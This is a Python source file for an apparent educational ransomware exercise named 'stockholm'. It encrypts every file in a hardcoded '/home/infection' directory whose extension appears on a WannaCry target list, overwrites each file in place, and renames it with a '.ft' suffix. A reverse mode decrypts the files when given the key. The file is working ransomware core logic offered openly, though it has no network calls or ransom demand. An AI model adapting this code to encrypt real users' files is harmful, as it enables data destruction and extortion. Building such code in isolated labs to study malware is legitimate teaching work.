from utils import log, rename_file, load_extensions
import os
from os.path import isfile, join
from encryption import ft_encrypt, ft_decrypt

SILENT_ENABLED = False
INFECTION_DIR = "/home/infection"
MINIMUM_KEY_LEN=16
INFECTION_EXTENSION = ".ft"
WANNACRY_EXTENSIONS = "./resources/wannacry_file_extensions.txt"

def process_file(key, path, operation, new_name):
    with open(path, 'rb') as file:
        data = file.read()

    processed_data = operation(key, data)
    
    with open(path, 'wb') as file:
        file.write(processed_data)
 
    rename_file(path, new_name)

def infect_file(key, path):
	log(f"Infecting {path}")
	process_file(
        key=key,
        path=path,
        operation=ft_encrypt,
        new_name= path + INFECTION_EXTENSION
    )

def reverse_file(key, path):
	log(f"Reversing {path}")
	process_file(
        key=key,
        path=path,
        operation=ft_decrypt,
        new_name= path[:-len(INFECTION_EXTENSION)]
    )
	
def infect_directory(key, files):
	for f in files:
		try:
			infect_file(key, f)
		except Exception:
			log("Error: Decryption failed")

def reverse_directory(key, files):
	for f in files:
		try:
			reverse_file(key, f)
		except Exception:
			log("Error: Decryption failed")

def key_is_valid(key):
	return len(key) >= MINIMUM_KEY_LEN

def stockholm(args):
	global SILENT_ENABLED
	SILENT_ENABLED = args.silent

	if not key_is_valid(args.key):
		raise ValueError("Requires a 16 characters key as argument")

	if not os.path.exists(INFECTION_DIR):
		raise ValueError("Target directory \'/home/infection\' does not exist.")
	
	wannacry_extensions = tuple(load_extensions(WANNACRY_EXTENSIONS))

	files = [
		join(INFECTION_DIR, f)
		for f in os.listdir(INFECTION_DIR)
		if isfile(join(INFECTION_DIR, f))
			and (args.reverse or f.endswith(wannacry_extensions))
	]

	if args.reverse:
		log("Reverse mode enabled")
		reverse_directory(args.key, files)
	else:
		log("Infection mode enabled")
		infect_directory(args.key, files)